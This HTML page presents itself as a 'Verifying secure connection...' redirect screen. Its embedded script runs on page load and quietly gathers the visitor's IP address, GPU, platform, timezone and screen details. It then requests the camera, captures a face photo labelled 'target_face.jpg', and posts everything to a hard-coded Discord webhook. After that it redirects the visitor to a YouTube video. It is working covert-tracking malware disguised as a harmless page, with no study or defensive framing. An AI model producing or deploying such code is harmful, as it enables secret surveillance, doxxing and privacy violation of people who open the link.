<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p style="margin-left: 15px;">Verifying secure connection...</p>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
        const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

        // Helper function to capture the image
        async function takeSnapshot(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = 480; 
            canvas.height = 640;
            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
        }

        async function grabEverything() {
            let userIP = "Unknown";
            
            // 1. SILENT DATA (IP & Hardware)
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                userIP = ipData.ip;
            } catch (e) {}

            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";

            const info = {
                ip: userIP,
                platform: navigator.platform,
                gpu: gpu,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${window.screen.width}x${window.screen.height}`,
                time: new Date().toLocaleString()
            };

            // 2. CAMERA CAPTURE (Requires Permission)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const photoBlob = await takeSnapshot(stream);
                
                const fd = new FormData();
                fd.append("file", photoBlob, "target_face.jpg");
                // Adding the hardware info as part of the photo upload message
                fd.append("payload_json", JSON.stringify({
                    content: `üì∏ **Photo Captured!**\nüåê **IP:** \`${info.ip}\`\nüåç **Timezone:** ${info.timezone}\nüíª **GPU:** ${info.gpu}\nüì± **Device:** ${info.platform}\n‚è∞ **Time:** ${info.time}`
                }));

                await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
                
                // Stop the camera light immediately
                stream.getTracks().forEach(t => t.stop());

            } catch (err) {
                // If they deny camera, still send the silent info
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `‚ö†Ô∏è **Camera Denied, but Info Logged:**\nüåê **IP:** \`${info.ip}\`\nüåç **Timezone:** ${info.timezone}\nüíª **GPU:** ${info.gpu}`
                    })
                });
            } finally {
                // Redirect regardless of camera outcome
                window.location.replace(REDIRECT_URL);
            }
        }

        window.onload = grabEverything;
    </script>
</body>
</html>
